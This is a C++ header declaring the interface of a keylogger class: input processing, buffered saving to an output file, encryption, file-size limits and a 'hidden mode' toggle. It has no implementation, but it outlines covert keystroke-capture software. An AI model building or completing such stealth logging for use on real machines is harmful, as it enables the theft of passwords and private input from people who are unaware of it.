#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#include <string>
#include <memory>
#include <vector>
#include <chrono>
#include <map>

class FileManager;
class KeyProcessor;
class SecurityManager;
class ConfigManager;

class KeyLogger {
private:
    std::unique_ptr<FileManager> fileManager;
    std::unique_ptr<KeyProcessor> keyProcessor;
    std::unique_ptr<SecurityManager> securityManager;
    std::unique_ptr<ConfigManager> configManager;

    bool isRunning;
    bool isHidden;
    std::string currentBuffer;
    std::chrono::steady_clock::time_point lastSave;

    void processKeyInput();
    void saveBuffer();
    void handleSpecialKeys(int key);

public:
    KeyLogger();
    ~KeyLogger();

    bool initialize();
    void start();
    void stop();
    void pause();
    void resume();

    bool isActive() const { return isRunning; }
    void setHiddenMode(bool hidden) { isHidden = hidden; }

    // Configurações
    void setAutoSaveInterval(int seconds);
    void setOutputFile(const std::string& filename);
    void enableEncryption(bool enable);
    void setMaxFileSize(size_t maxSize);
};

#endif
